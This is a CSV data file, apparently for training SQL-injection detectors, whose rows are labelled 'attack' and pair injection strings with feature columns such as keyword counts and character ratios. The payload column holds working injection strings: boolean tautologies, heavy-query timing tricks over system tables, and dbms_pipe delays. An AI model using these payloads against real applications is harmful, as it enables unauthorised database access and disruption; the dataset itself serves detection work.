id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001120,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,7.210410915623367,234.44491577148438,87.25715637207031,23.75745964050293,90.70387268066406,0.2603352963924408,31.646709442138672,23.631574630737305,1.3320024013519287,0.285685658454895,0.11398246139287949,0.3193453848361969,0.15153281390666962,4.072713375091553,0.4270092844963074,1.022645115852356,-0.20569829642772675,0.13272421061992645,-0.1281873732805252,-0.8293997049331665,6.573009490966797,6.95546817779541,1.5686373710632324,0.47497108578681946,1.4209976196289062,-0.6553517580032349,0.3500300645828247,0.001496214885264635,2.4270949363708496,1.2842365503311157,1.1923787593841553,-0.9139595031738281,-0.036051299422979355,-0.2984151840209961,0.3792048990726471,1.1026169061660767,6.4885478019714355,0.8356025218963623,1.1651501655578613,0.49684053659439087,0.5320176482200623,0.8608759045600891,0.09776081889867783,0.06411425769329071,0.19574037194252014,0.41668039560317993,0.011701319366693497,0.4195370376110077,0.27908769249916077,0.583230197429657,0.14474451541900635,0.1678849160671234,-0.4188362658023834,0.7946301102638245,0.10278096050024033,-0.49118003249168396,0.7809576392173767,0.1301485151052475,-0.6806831955909729,-0.6595841646194458,-0.671038031578064,0.2110053151845932,0.5438946485519409,5.891824722290039,-0.06050862371921539,0.023825064301490784,0.04537586495280266,0.2559356689453125,-0.2521921992301941,0.4383504390716553,-0.3799666464328766,1.2179136276245117,-1.073927640914917,0.13033296167850494,0.25658828020095825,-1.0773303508758545,1.4056191444396973,0.8499814867973328,-0.2900001108646393,-0.24767859280109406,-0.2112821787595749,9.780982971191406,1.3444422483444214,0.2955814599990845,0.39624667167663574,-0.9051602482795715,1.0953198671340942,0.39858242869377136,-0.44433897733688354
GAN_001121,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,6.503829191168364,234.2563018798828,88.46342468261719,22.695554733276367,88.10049438476562,0.27235984802246094,36.89311218261719,23.536521911621094,1.1655700206756592,0.2730541527271271,0.11511153727769852,0.32785719633102417,0.15170300006866455,3.9270787239074707,0.6652022004127502,1.1307334899902344,-0.038981013000011444,0.13164035975933075,-0.22140508890151978,-0.5962806344032288,7.4969072341918945,8.806559562683105,1.8042333126068115,0.49398139119148254,1.4124295711517334,-0.4330557584762573,0.18925167620182037,0.042024750262498856,2.022005796432495,1.0579993724822998,0.9533485174179077,-0.7758254408836365,-0.05972110852599144,-0.10934778302907944,0.4880649149417877,1.2931489944458008,8.203502655029297,1.0036848783493042,1.3787956237792969,0.17875990271568298,0.5578493475914001,0.5235178470611572,0.3170674741268158,0.3066610097885132,0.0017479844391345978,0.2580401301383972,0.4583910405635834,0.33663129806518555,0.32868531346321106,0.36608704924583435,0.12781931459903717,0.2037622332572937,-0.52500981092453,0.17898797988891602,-0.10077778995037079,-0.4930041432380676,0.5400911569595337,0.007880115881562233,-0.5985415577888489,-0.48607000708580017,-0.7264347672462463,-0.04251714050769806,0.17604157328605652,6.340421676635742,-0.008362963795661926,0.058122243732213974,0.0911303460597992,-0.04411594569683075,-0.14210790395736694,0.4934895634651184,-0.3897070288658142,1.177288293838501,-0.6295927166938782,0.11128004640340805,0.21651522815227509,-0.9980471134185791,1.2918931245803833,0.7417867183685303,-0.19584321975708008,-0.27442821860313416,-0.006863411515951157,11.668758392333984,1.0379142761230469,0.30649030208587646,0.4653046727180481,-0.7318162322044373,0.5881576538085938,0.29374226927757263,-0.60957932472229
GAN_001122,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.860363372427509,218.45753479003906,82.95291900634766,17.388683319091797,69.65857696533203,0.3016244173049927,46.18026351928711,26.0079402923584,1.2588690519332886,0.30304479598999023,0.14191840589046478,0.3187639117240906,0.15647311508655548,3.9212570190429688,0.48385363817214966,0.7737031579017639,0.17952848970890045,0.08950374275445938,-0.04769512265920639,-0.4694060981273651,6.283817768096924,5.949642181396484,1.6246423721313477,0.5360386371612549,1.4369956254959106,-0.0941280722618103,0.09894616901874542,0.345691442489624,1.813029408454895,0.9038920402526855,0.8015157580375671,-0.5502466559410095,-0.018273014575242996,-0.2560078799724579,0.3467128276824951,1.3226507902145386,7.160109043121338,0.9694069027900696,1.0136466026306152,0.16378553211688995,0.55899578332901,0.8306366801261902,0.09085238724946976,0.10362011939287186,-0.3550953269004822,0.36575356125831604,0.15228451788425446,0.3731362819671631,0.2868954539299011,0.40086984634399414,0.162190780043602,0.15056131780147552,-0.3414406180381775,0.5168735384941101,-0.12130188941955566,-0.3944779336452484,0.5343602895736694,0.034550487995147705,-0.7015464305877686,-0.22834888100624084,-0.25606492161750793,0.04502832144498825,0.4582368731498718,4.798548698425293,-0.25086963176727295,0.017655648291110992,0.07317530363798141,0.40243393182754517,-0.09066134691238403,0.3177454471588135,-0.32873281836509705,0.7989891171455383,-0.6118216514587402,0.1203417032957077,0.019323907792568207,-0.8268475532531738,1.2728829383850098,0.7108187675476074,-0.38210007548332214,-0.12457912415266037,-0.07157625257968903,7.98838472366333,1.1803747415542603,0.10979118943214417,0.2486683875322342,-0.4871531128883362,0.5901921391487122,0.24572424590587616,-0.37232089042663574
GAN_001123,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,4.919892163515835,221.30450439453125,77.1487045288086,22.90138053894043,73.18956756591797,0.15530042350292206,53.44041442871094,25.738693237304688,1.1281605958938599,0.31962424516677856,0.13537640869617462,0.34199339151382446,0.14532144367694855,3.907745838165283,1.0438638925552368,0.8308164477348328,0.491192102432251,0.04776916280388832,0.041450366377830505,-0.2893648147583008,6.169963836669922,7.385869979858398,2.0711987018585205,0.21942132711410522,1.536152958869934,-0.1857101321220398,0.14737200736999512,0.24759520590305328,1.6198906898498535,0.8980835676193237,0.5183685421943665,-0.4501585066318512,0.0319739505648613,-0.006078194826841354,0.4753822386264801,1.4002165794372559,6.425808429718018,0.8044198751449585,0.9473724365234375,0.13706934452056885,0.45007771253585815,0.6261312365531921,0.13405530154705048,0.14483574032783508,-0.012286525219678879,0.2585766911506653,0.0897410437464714,0.28967341780662537,0.19689972698688507,0.31405943632125854,0.12600401043891907,0.2215469479560852,-0.2526828646659851,0.24488390982151031,0.14185214042663574,-0.11921051144599915,0.31941044330596924,0.06600573658943176,-0.3316037654876709,-0.2733004093170166,-0.451519250869751,-0.021785035729408264,0.19785764813423157,3.350464344024658,-0.06059125065803528,0.061901114881038666,0.06138991564512253,0.07789219915866852,0.015213701874017715,0.2483474314212799,-0.2827659547328949,0.48627614974975586,-0.5366909503936768,0.0711485743522644,0.13712078332901,-0.6348240375518799,1.0949021577835083,0.6520201563835144,-0.1264781951904297,-0.08291914314031601,-0.14162498712539673,8.145785331726074,1.0276497602462769,0.2674148380756378,0.31418532133102417,-0.43142440915107727,0.4319596588611603,0.28328222036361694,-0.17594559490680695
GAN_001124,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.172801633163379,232.4705810546875,87.3634262084961,18.302173614501953,76.55654907226562,0.3168068826198578,43.974857330322266,26.1455078125,1.3409427404403687,0.2966096103191376,0.12834791839122772,0.30780041217803955,0.15457932651042938,3.996210813522339,0.3939064145088196,0.6315612196922302,-0.0031772179063409567,0.11515723168849945,-0.09647580236196518,-0.4308966100215912,6.492673873901367,6.190694808959961,1.3783245086669922,0.3027523159980774,1.5198452472686768,-0.3983663022518158,0.11147600412368774,0.21845503151416779,1.6191493272781372,1.0339202880859375,1.0074044466018677,-0.5946655869483948,-0.08331995457410812,-0.2678988575935364,0.40208375453948975,1.2012825012207031,6.450742244720459,1.0129992961883545,0.9850443005561829,0.12076106667518616,0.5308419466018677,0.8957593441009521,0.05506202578544617,0.17672333121299744,-0.01634596846997738,0.37992286682128906,0.15675956010818481,0.3582186996936798,0.3013019263744354,0.36595964431762695,0.14840880036354065,0.1967024952173233,-0.24400125443935394,0.559185802936554,0.06615917384624481,-0.41062527894973755,0.6065881848335266,0.01563071645796299,-0.5886229872703552,-0.6077108979225159,-0.3469327390193939,-0.007041662931442261,0.4525383710861206,4.865985870361328,0.02596159279346466,0.0073075550608336926,0.10871732980012894,0.45298314094543457,-0.12917546927928925,0.1687765270471573,-0.4901989698410034,0.9357723593711853,-0.7109503149986267,0.09500841796398163,0.21548695862293243,-1.0074313879013062,1.3369264602661133,0.7087569832801819,-0.5214805603027344,-0.25831863284111023,0.07177913188934326,8.874448776245117,1.1558837890625,0.19880028069019318,0.3426145315170288,-0.5826084017753601,0.80424565076828,0.4788687527179718,-0.4802064299583435
GAN_001125,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.022653446002828,199.1148223876953,87.89427185058594,24.06563949584961,65.2134780883789,0.18894371390342712,58.698890686035156,24.035051345825195,1.2165336608886719,0.34438735246658325,0.12146202474832535,0.3424873352050781,0.13930056989192963,3.817230463027954,1.042007565498352,0.6035550832748413,0.3736097812652588,0.07054492086172104,-0.10907088965177536,-0.058925654739141464,7.182933807373047,5.599195957183838,2.3729987144470215,0.18964985013008118,1.541142463684082,-0.5218130946159363,-0.02873445674777031,0.12589822709560394,1.8865149021148682,1.0417908430099487,0.7545115351676941,-0.588422954082489,-0.07986410707235336,-0.17536643147468567,0.4068504571914673,1.2641541957855225,6.0978569984436035,0.901482343673706,0.827345609664917,0.23353372514247894,0.48389744758605957,0.8725298047065735,-0.10600684583187103,0.32998770475387573,-0.17528071999549866,0.3145679533481598,0.17107199132442474,0.1865907460451126,0.23525503277778625,0.2654384672641754,0.12026727944612503,0.10489274561405182,-0.3352144658565521,0.20854711532592773,-0.0166795551776886,-0.21139690279960632,0.23170208930969238,0.13901086151599884,-0.4416431188583374,-0.14348700642585754,-0.4640207886695862,0.08755876123905182,0.19237491488456726,3.1324338912963867,-0.052812062203884125,0.0017867342103272676,0.04379463940858841,0.24227896332740784,-0.00030794739723205566,0.3282715380191803,-0.19392439723014832,0.7420215010643005,-0.537861704826355,0.06275258958339691,0.18569862842559814,-0.6743406057357788,1.1140469312667847,0.6779010891914368,0.05856668949127197,-0.14609263837337494,0.19588936865329742,8.921578407287598,1.1513121128082275,0.06642472743988037,0.23557476699352264,-0.40430742502212524,0.32574698328971863,0.31401243805885315,-0.44319456815719604
GAN_001126,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.486374988639299,231.18959045410156,83.3392562866211,23.523330688476562,79.45913696289062,0.15582142770290375,45.91332244873047,25.629018783569336,1.0541410446166992,0.29000696539878845,0.12151782214641571,0.3246254622936249,0.14678581058979034,3.9944887161254883,1.3036624193191528,1.0356593132019043,0.056604690849781036,0.07223887741565704,-0.08537115901708603,-0.380887508392334,6.104920387268066,6.309622287750244,2.2818491458892822,0.31369879841804504,1.4470258951187134,-0.41007083654403687,0.05868929252028465,0.1816583275794983,1.8744961023330688,1.089105486869812,0.6278720498085022,-0.504328727722168,-0.12517434358596802,-0.17193511128425598,0.44695615768432617,1.393432855606079,5.9247283935546875,0.6791907548904419,1.0426908731460571,0.19305601716041565,0.515011191368103,0.6532800793647766,0.05737811699509621,0.031139876693487167,-0.0039408206939697266,0.39437687397003174,0.15224121510982513,0.2997228503227234,0.21289561688899994,0.39529991149902344,0.1394798755645752,0.16797955334186554,-0.5070536136627197,0.5228556990623474,0.1262076497077942,-0.12537792325019836,0.582740068435669,0.13547347486019135,-0.288838267326355,-0.2238832414150238,-0.5781581401824951,0.10579049587249756,0.1381140649318695,3.809009313583374,0.08087705075740814,0.033493395894765854,0.05886673927307129,0.2027367651462555,0.02946612425148487,0.3598429262638092,-0.3734528422355652,0.7896953821182251,-0.6446995139122009,0.0826132595539093,0.05123056098818779,-0.821875810623169,1.142986536026001,0.6976829767227173,-0.13106940686702728,-0.21839205920696259,-0.1967131644487381,7.966444969177246,1.1307580471038818,0.3820030689239502,0.4368002414703369,-0.3650584816932678,0.4548599421977997,0.3334353268146515,-0.14715245366096497
GAN_001127,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,5.324387875068548,199.65921020507812,72.48454284667969,18.923370361328125,57.043155670166016,0.19712857902050018,38.11504364013672,23.82251739501953,1.0278587341308594,0.28215229511260986,0.1538536697626114,0.3265986442565918,0.15941065549850464,3.832736015319824,0.7737151384353638,0.8849841952323914,0.3546207547187805,0.07583386451005936,-0.035630978643894196,-0.3097388744354248,4.918210983276367,5.361668109893799,1.7239898443222046,0.3093753755092621,1.4088866710662842,-0.32366934418678284,0.05743036046624184,0.1737876981496811,1.7003216743469238,0.7831876277923584,0.6478509306907654,-0.5380047559738159,-0.020098339766263962,-0.7004013061523438,0.3395736813545227,1.447839379310608,6.519394397735596,0.6975829601287842,0.9538249969482422,0.30905693769454956,0.46249812841415405,0.7993148565292358,0.03116592764854431,0.0010354220867156982,-0.2549605369567871,0.3282957077026367,0.2466011345386505,0.2715776860713959,0.2430211901664734,0.33677586913108826,0.06337867677211761,0.14208650588989258,-0.40210312604904175,0.3360329270362854,0.02338196337223053,-0.39353352785110474,0.3772681653499603,0.15504184365272522,-0.37218737602233887,-0.28462010622024536,-0.40472081303596497,0.1991143375635147,0.2810697555541992,2.7775449752807617,-0.2582327723503113,0.021008679643273354,0.04721293970942497,0.2012498676776886,-0.3823913335800171,0.2902464270591736,-0.28169113397598267,0.74280846118927,-0.7535715103149414,0.06447603553533554,0.12115325033664703,-0.693038821220398,1.116365671157837,0.7261450886726379,-0.3285118639469147,-0.0918767973780632,-0.195448637008667,6.727306842803955,1.1540367603302002,-0.11231161653995514,0.3543998599052429,-0.22911560535430908,0.38837572932243347,0.32040560245513916,-0.3100350499153137
GAN_001128,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,5.60589141803885,232.67958068847656,82.85649108886719,20.47124671936035,77.0400619506836,0.1665450781583786,39.918365478515625,23.5507869720459,1.1214203834533691,0.28796350955963135,0.13962996006011963,0.3261067867279053,0.14734132587909698,3.9365322589874268,0.6344992518424988,0.9407455325126648,0.013878531754016876,0.08964553475379944,-0.04463636130094528,-0.23837782442569733,5.704956531524658,5.858316421508789,1.716216802597046,0.4472842514514923,1.4270083904266357,-0.40549466013908386,0.16417984664440155,0.20888850092887878,1.7880560159683228,0.9528427124023438,0.6519602537155151,-0.42961370944976807,-0.021306272596120834,-0.22086623311042786,0.4078769385814667,1.2879033088684082,6.331103801727295,0.8770557045936584,0.9664357304573059,0.09983544051647186,0.4245167076587677,0.6295037269592285,0.0792572870850563,0.17523305118083954,-0.1852400004863739,0.3771176040172577,0.34750673174858093,0.2885836660861969,0.22554565966129303,0.30118900537490845,0.08399715274572372,0.14473052322864532,-0.3032708168029785,0.2712875008583069,0.026533950120210648,-0.2920137941837311,0.5371800065040588,0.03378288447856903,-0.5454761385917664,-0.30713191628456116,-0.43327659368515015,-0.16666439175605774,0.21055591106414795,4.024115085601807,-0.0021580681204795837,0.035993583500385284,0.08742736279964447,0.2241612821817398,-0.06151184067130089,0.22509482502937317,-0.3284171521663666,0.8782110214233398,-0.6395630240440369,0.08647394180297852,0.2446267306804657,-0.7691034078598022,1.201304316520691,0.768247127532959,-0.29495471715927124,-0.1825939267873764,0.07668907940387726,7.919488906860352,1.1083571910858154,0.24124526977539062,0.22436165809631348,-0.30735868215560913,0.3678337335586548,0.3286163806915283,-0.42977309226989746
GAN_001129,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,7.1531112751703985,237.21475219726562,80.95596313476562,14.581257820129395,78.37642669677734,0.40640565752983093,18.428627014160156,22.99915885925293,1.4546130895614624,0.23247814178466797,0.09278585016727448,0.30720722675323486,0.14689283072948456,3.9299933910369873,0.42542797327041626,0.7265031933784485,0.010503597557544708,0.16537757217884064,-0.04894048720598221,-0.7807824015617371,5.543808937072754,6.968923568725586,0.8912662863731384,0.5415642261505127,1.259552240371704,-0.36634907126426697,0.3502926230430603,0.14131751656532288,1.7651156187057495,1.1105666160583496,1.0659373998641968,-0.7546674609184265,-0.02761485055088997,-0.48278048634529114,0.34147101640701294,1.1271735429763794,8.270040512084961,0.8863391280174255,1.2695456743240356,0.5601857304573059,0.4308599531650543,0.7935036420822144,0.46187594532966614,0.27432531118392944,-0.07663914561271667,0.7133417129516602,0.12032127380371094,0.38961800932884216,0.2509656846523285,0.4099871516227722,0.09476877003908157,0.09092268347740173,-0.3993569016456604,0.36907973885536194,-0.2799147069454193,-0.9495750069618225,0.872622549533844,-0.09792705625295639,-0.9488087892532349,-0.7246478796005249,-0.5479164719581604,0.1041678711771965,0.6850961446762085,4.909597396850586,-0.4400389790534973,0.0006597482715733349,0.09240463376045227,0.04757716506719589,-0.5693212747573853,0.5656774044036865,-0.45590993762016296,1.2109531164169312,-0.857620120048523,0.12008669972419739,0.21301300823688507,-1.140723705291748,1.45281183719635,0.898750364780426,-0.5329461097717285,-0.3061091899871826,0.04541787877678871,8.78561019897461,1.2754687070846558,0.0861467719078064,0.20739471912384033,-0.5994373559951782,1.0047938823699951,0.5551919341087341,-0.4138398766517639
GAN_001130,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,5.00792689356553,212.51783752441406,77.1976547241211,21.321712493896484,79.25955200195312,0.20348940789699554,35.328182220458984,24.05611801147461,1.1338696479797363,0.2800154685974121,0.11994215846061707,0.34318262338638306,0.14837029576301575,3.841508388519287,0.8939945697784424,1.1263542175292969,0.08499021083116531,0.09190569072961807,-0.12020014971494675,-0.1296672374010086,6.896167755126953,6.343825340270996,1.9475914239883423,0.26687049865722656,1.4547703266143799,-0.2789685130119324,0.05863405391573906,0.11035142093896866,1.8637681007385254,0.841467022895813,0.4698723554611206,-0.4115533232688904,0.06659403443336487,-0.41456669569015503,0.40452542901039124,1.5656418800354004,5.873096466064453,0.9614158868789673,1.1796236038208008,0.0554550476372242,0.5629584193229675,0.4807848036289215,-0.05616811662912369,0.08726632595062256,0.03966521471738815,0.15368077158927917,0.34833601117134094,0.1561235934495926,0.19745154678821564,0.29982709884643555,0.0578904002904892,0.10422513633966446,-0.47624140977859497,0.10380663722753525,-0.0037798210978507996,-0.23799709975719452,0.16972030699253082,0.06005408614873886,-0.4475071430206299,-0.4299769103527069,-0.4836149513721466,0.03951029106974602,-0.009506870061159134,4.193464279174805,0.024944216012954712,0.04406171292066574,0.055067818611860275,-0.11917392909526825,-0.1860010027885437,0.20287829637527466,-0.3286442160606384,0.6516476273536682,-0.3360511362552643,0.05006324127316475,0.38394469022750854,-0.4757860004901886,1.0859500169754028,0.7672719359397888,-0.1589355319738388,-0.1438513547182083,0.11299693584442139,8.902543067932129,1.0275996923446655,0.10644645988941193,0.6096259951591492,-0.2941489517688751,0.19275903701782227,-0.017039112746715546,-0.4122256636619568
GAN_001131,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,6.503530018813218,233.6453857421875,93.70498657226562,16.409687042236328,75.30119323730469,0.2924891710281372,49.790679931640625,26.224573135375977,1.1619205474853516,0.2709011137485504,0.13713370263576508,0.33415356278419495,0.16182999312877655,3.949719190597534,0.5506977438926697,0.9161783456802368,-0.05055683106184006,0.099553182721138,-0.11933431774377823,-0.4163472652435303,6.526857376098633,5.300549507141113,1.9065260887145996,0.5394290089607239,1.4095028638839722,-0.6018143892288208,0.06020544096827507,0.21794936060905457,1.6783674955368042,1.0457020998001099,0.9590284824371338,-0.8360971808433533,-0.04568783566355705,-0.39343899488449097,0.3681204915046692,1.2137982845306396,7.079033374786377,0.9065681099891663,0.8948635458946228,0.30906713008880615,0.4423883855342865,0.9435601830482483,0.0629749745130539,0.23887678980827332,-0.2217901051044464,0.41607052087783813,0.2600066661834717,0.3859212398529053,0.2944343388080597,0.37153416872024536,0.12311379611492157,0.09849873185157776,-0.5435035228729248,0.5662780404090881,-0.05111415684223175,-0.41930636763572693,0.6755006313323975,0.21653392910957336,-0.905576765537262,-0.43758323788642883,-0.3371259570121765,-0.2353101223707199,0.43691152334213257,5.151966571807861,-0.0051154568791389465,-0.00401356490328908,0.12223337590694427,0.2286539077758789,-0.07119125127792358,0.5390323400497437,-0.5122028589248657,1.0597081184387207,-0.9392873644828796,0.11950832605361938,0.005896285176277161,-1.0059341192245483,1.4776523113250732,0.740163266658783,-0.3918405771255493,-0.2876599133014679,-0.1834157258272171,9.257631301879883,1.2455190420150757,0.2108241617679596,0.36733466386795044,-0.6928747892379761,0.7171546220779419,0.5256733894348145,-0.5222682356834412
GAN_001132,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,7.937716847829019,274.89703369140625,97.39457702636719,23.851011276245117,96.10540771484375,0.3297627866268158,31.022659301757812,22.81852912902832,1.4665372371673584,0.24353602528572083,0.10197778791189194,0.2978232502937317,0.13949935138225555,4.122262001037598,0.5054988265037537,0.8406293988227844,-0.4285866618156433,0.1698244959115982,-0.18708160519599915,-0.7032106518745422,5.7357563972473145,7.814843654632568,1.501634120941162,0.3836349844932556,1.2214022874832153,-0.8268743753433228,0.17666400969028473,0.13934555649757385,2.008004903793335,1.5079991817474365,1.4428049325942993,-1.03085458278656,-0.281769722700119,-0.12734554708003998,0.44102829694747925,0.8858562111854553,7.006746292114258,0.7028779983520508,1.2479889392852783,0.4206448495388031,0.49366357922554016,0.9520848393440247,0.2867347002029419,0.45125076174736023,0.1661624014377594,1.026471734046936,0.06251741945743561,0.4665415585041046,0.19532185792922974,0.5855180025100708,0.10252708196640015,0.09593459218740463,-0.5717328190803528,0.6588448882102966,0.042382337152957916,-0.4539731740951538,1.1308780908584595,-0.09320475906133652,-0.7484980821609497,-0.7606192231178284,-0.6890314221382141,0.32331162691116333,0.381024569272995,5.004610538482666,-0.026515744626522064,-0.030048880726099014,0.07619456201791763,0.24044090509414673,-0.04727117344737053,0.5026129484176636,-0.4939357042312622,1.6678619384765625,-1.1087942123413086,0.12993279099464417,0.4836585521697998,-1.3471996784210205,1.5064715147018433,0.7695745825767517,-0.2886215150356293,-0.38960373401641846,0.04290466755628586,10.75292682647705,1.39579439163208,0.47805991768836975,0.1679634153842926,-0.9793607592582703,1.1699453592300415,1.046030044555664,-0.31209129095077515
GAN_001133,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,6.031162574016446,226.16819763183594,88.68560791015625,20.402793884277344,68.385009765625,0.28233861923217773,42.90367126464844,26.235923767089844,1.0344791412353516,0.29274818301200867,0.11404934525489807,0.3013730049133301,0.1571209579706192,3.991147041320801,0.6990595459938049,0.8194866180419922,-0.021935157477855682,0.11546025425195694,-0.126784086227417,-0.41581615805625916,6.309889793395996,5.236096382141113,2.3601934909820557,0.4050363302230835,1.4764679670333862,-0.6032199263572693,-0.05921018123626709,-0.06219915673136711,2.0662996768951416,1.143196702003479,0.9579347968101501,-0.6731012463569641,-0.00023475576017517596,-0.40965986251831055,0.4518427550792694,1.2572110891342163,5.695370197296143,0.8990433216094971,1.117672324180603,0.29088908433914185,0.5762826204299927,0.8304610252380371,-0.029034871608018875,0.2655177116394043,-0.16473311185836792,0.3209482431411743,0.28642258048057556,0.30574971437454224,0.32557356357574463,0.3795289993286133,0.18429651856422424,0.08879823237657547,-0.2733807861804962,0.6700921654701233,-0.07372534275054932,-0.536888837814331,0.5848172903060913,-0.0877620205283165,-0.49084651470184326,-0.3129270672798157,-0.7370151877403259,0.194880411028862,0.18028545379638672,4.30185079574585,0.08920769393444061,0.036006391048431396,0.08316567540168762,0.43833738565444946,-0.2139776349067688,0.41221919655799866,-0.43211761116981506,1.0645668506622314,-0.9517972469329834,0.0858864113688469,0.1402655839920044,-1.0825570821762085,1.346359133720398,0.747860848903656,-0.34693318605422974,-0.19463084638118744,-0.09543509781360626,8.557751655578613,1.222411036491394,0.03955170139670372,0.2220647931098938,-0.5928212404251099,0.9151595234870911,0.36888647079467773,-0.41819626092910767
